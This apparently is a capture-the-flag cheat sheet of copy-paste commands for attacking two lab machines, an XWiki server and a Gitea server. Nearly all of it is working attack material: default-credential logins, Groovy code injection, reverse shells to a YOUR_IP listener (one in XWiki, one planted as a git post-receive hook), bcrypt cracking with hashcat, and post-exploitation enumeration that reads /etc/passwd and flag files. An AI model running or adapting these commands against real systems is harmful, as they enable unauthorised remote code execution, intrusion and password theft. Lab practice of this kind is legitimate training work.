# Quick Command Reference
## Copy-Paste Commands for Manual Execution

## System 1: Editor (XWiki) - 10.129.7.80

### Check Status
```bash
curl -s http://10.129.7.80:8080/xwiki/ | grep -i "initializing"
curl -s http://10.129.7.80:8080/xwiki/rest/ | grep -oP '<version>\K[^<]+'
```

### Try Default Credentials
```bash
curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin -d "j_username=admin&j_password=admin" -L -c cookies.txt -o login.html
grep -i "logout\|Dashboard" login.html
```

### If Authenticated - Template Injection
1. Login at: http://10.129.7.80:8080/xwiki
2. Create/edit page with:
```
{{groovy}}
def proc = 'whoami'.execute()
proc.waitFor()
println proc.text
{{/groovy}}
```

### Reverse Shell (Groovy)
```
{{groovy}}
def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
proc.waitFor()
{{/groovy}}
```

### Search Exploits
```bash
searchsploit xwiki 15
```

---

## System 4: Lock (Gitea) - 10.129.6.226

### Check Status
```bash
curl -s http://10.129.6.226:3000/api/v1/version
curl -s http://10.129.6.226:3000/user/sign_up | grep -i "register"
```

### Get CSRF Token & Login
```bash
CSRF=$(curl -s -c cookies.txt http://10.129.6.226:3000/user/login | grep -oP 'name="_csrf" value="\K[^"]*')
curl -s -X POST http://10.129.6.226:3000/user/login -d "user_name=admin&password=admin&_csrf=$CSRF" -b cookies.txt -c cookies.txt -L -o login.html
grep -i "dashboard\|repositories" login.html
```

### Enumerate Repositories
```bash
curl -s "http://10.129.6.226:3000/api/v1/repos/search?limit=50" | grep -oP '"full_name":"\K[^"]*'
```

### Git Hooks RCE (If Authenticated)
```bash
# 1. Create repo in web UI
# 2. Clone it:
git clone http://USER:PASS@10.129.6.226:3000/USER/REPO.git
cd REPO

# 3. Create hook:
mkdir -p .git/hooks
cat > .git/hooks/post-receive << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
EOF
chmod +x .git/hooks/post-receive

# 4. Commit & push:
git add .git/hooks/post-receive
git commit -m "Add hook"
git push

# 5. Set up listener first:
nc -lvp 4444
```

### Search Exploits
```bash
searchsploit gitea 1.21
```

---

## Hash Cracking (If Hash Found)

```bash
# Save hash to file
echo 'HASH_HERE' > hash.txt

# Crack bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Show result
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
```

---

## Reverse Shell Listeners

```bash
# Set up listener
nc -lvp 4444

# Get your IP
ip addr show tun0
# or
ifconfig
```

---

## Post-Exploitation Commands

### Linux:
```bash
whoami
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null
cat /root/root.txt
cat /home/*/user.txt
```

### Windows:
```powershell
whoami
hostname
systeminfo
ipconfig /all
net user
net localgroup administrators
dir C:\Users\*\Desktop\user.txt /s
dir C:\Users\*\Desktop\root.txt /s
```

---

## Full Command Lists

See detailed command lists in:
- `SCRIPTS/MANUAL_COMMANDS_SYSTEM1_EDITOR.txt`
- `SCRIPTS/MANUAL_COMMANDS_SYSTEM4_LOCK.txt`

